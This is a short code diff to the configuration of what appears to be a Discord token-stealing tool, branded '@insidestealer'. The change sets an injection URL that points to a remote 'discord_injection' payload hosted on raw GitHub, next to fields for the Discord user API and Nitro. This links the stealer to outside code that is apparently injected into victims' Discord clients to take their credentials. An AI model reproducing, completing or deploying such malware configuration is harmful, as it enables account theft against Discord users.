@@ -15,7 +15,7 @@ const config = {
     embed_icon: 'https://media.discordapp.net/attachments/972489263230910464/1176158780946395186/IMG_9544.jpg?ex=65ae73b9&is=659bfeb9&hm=3f034ca75ad6f52d3bb19d3c3ce1afda458f7401d7f951686245f206f2e7e26d&=&format=webp&width=671&height=671'.replace(/ /g, '%20'),
     embed_color: 3092790,
     embed_text: `🏴‍☠️ Piracy is never finished - @insidestealer`,
-    injection_url: '',
+    injection_url: 'https://raw.githubusercontent.com/alv7n/injxtbonmzosfnet/main/discord_injection',
 
     api: 'https://discord.com/api/v9/users/@me',
     nitro: {
